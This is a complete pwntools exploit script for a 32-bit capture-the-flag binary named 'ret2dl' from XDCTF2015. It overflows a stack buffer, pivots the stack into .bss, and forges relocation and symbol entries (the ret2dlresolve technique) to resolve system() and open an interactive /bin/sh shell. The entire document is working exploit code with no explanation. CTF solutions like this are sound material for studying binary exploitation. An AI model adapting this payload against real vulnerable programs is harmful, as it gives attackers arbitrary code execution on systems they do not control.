from pwn import *

elf = ELF('./ret2dl')
offset = 112
read_plt = elf.plt['read']
write_plt = elf.plt['write']

ppp_ret = 0x8048619
pop_ebp_ret = 0x804861b

level_ret = 0x8048458

bss_addr = elf.bss()
stack_size = 0x800
base_stage = bss_addr + stack_size

sh = process('./ret2dl')

payload = flat(['a'*offset, read_plt, ppp_ret, 0, base_stage,
                100, pop_ebp_ret, base_stage, level_ret])
sh.sendlineafter('Welcome to XDCTF2015~!\n', payload)

cmd = '/bin/sh'
plt_0 = 0x8048380
rel_plt = 0x8048330

# index_offset = 0x20 stage2
index_offset = (base_stage + 28) - rel_plt
write_got = elf.got['write']
r_info = 0x607
dynsym = 0x80481d8
dynstr = 0x8048278
fake_sym_addr = base_stage + 36
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf)
fake_sym_addr = fake_sym_addr + align
index_dynsym = (fake_sym_addr - dynsym) / 0x10
r_info = (index_dynsym << 8) | 0x7
fake_reloc = p32(write_got) + p32(r_info)
st_name = (fake_sym_addr + 0x10) - dynstr
fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)

payload2 = 'AAAA'
payload2 += p32(plt_0)
payload2 += p32(index_offset)
payload2 += 'AAAA'
payload2 += p32(base_stage + 80)
payload2 += 'aaaaaaaa'
payload2 += fake_reloc
payload2 += 'B' * align
payload2 += fake_sym
payload2 += 'system\x00'
payload2 += 'A' * (80 - len(payload2))
payload2 += cmd + '\x00'
payload2 += 'A' * (100 - len(payload2))
sh.sendline(payload2)

sh.interactive()
